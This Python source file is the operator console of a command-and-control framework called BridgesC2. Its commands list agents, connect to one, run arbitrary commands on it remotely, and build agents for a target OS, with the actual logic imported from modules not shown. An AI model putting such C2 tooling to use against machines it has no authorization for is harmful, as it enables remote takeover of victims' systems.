import cmd
import argparse
from client.commands import list as cmd_list
from client.commands import connect as cmd_connect
from client.commands import use as cmd_use
from client.commands import run as cmd_run
from client.commands import build as cmd_build
from client.state import state

class BridgesMeshCLI(cmd.Cmd):
    intro = "BridgesC2 Operator CLI. Type help or ? to list commands.\n"
    prompt = "(bridgesc2) "

    def do_list(self, arg):
        "List all registered agents"
        cmd_list.cmd_list()

    def do_connect(self, arg):
        "Connect to an agent: connect <agent_id>"
        agent_id = arg.strip()
        if not agent_id:
            print("Usage: connect <agent_id>")
            return
        cmd_connect.cmd_connect(agent_id)

    def do_use(self, arg):
        "Set active agent to send commands: use <agent_id>"
        agent_id = arg.strip()
        if not agent_id:
            print("Usage: use <agent_id>")
            return
        cmd_use.cmd_use(agent_id)

    def do_run(self, arg):
        "Run command on active agent: run <command>"
        command = arg.strip()
        if not command:
            print("Usage: run <command>")
            return
        cmd_run.cmd_run(command)

    def do_build(self, arg):
        """
        Build a micro-agent
        Usage: build --os <os_name> --name <agent_name> --output <output_file>
        """
        parser = argparse.ArgumentParser(prog="build")
        parser.add_argument("--os", required=True, help="Target OS (e.g. windows)")
        parser.add_argument("--name", required=True, help="Agent name")
        parser.add_argument("--output", required=True, help="Output filename")
        try:
            args = parser.parse_args(arg.split())
        except SystemExit:
            print("Invalid arguments. Usage: build --os <os_name> --name <agent_name> --output <output_file>")
            return
        
        cmd_build.cmd_build(args.os, args.name, args.output)

    def do_exit(self, arg):
        "Exit the CLI"
        print("Bye!")
        return True

    def do_EOF(self, arg):
        "Exit on Ctrl-D (EOF)"
        print()
        return True

    def emptyline(self):
        pass

if __name__ == "__main__":
    BridgesMeshCLI().cmdloop()
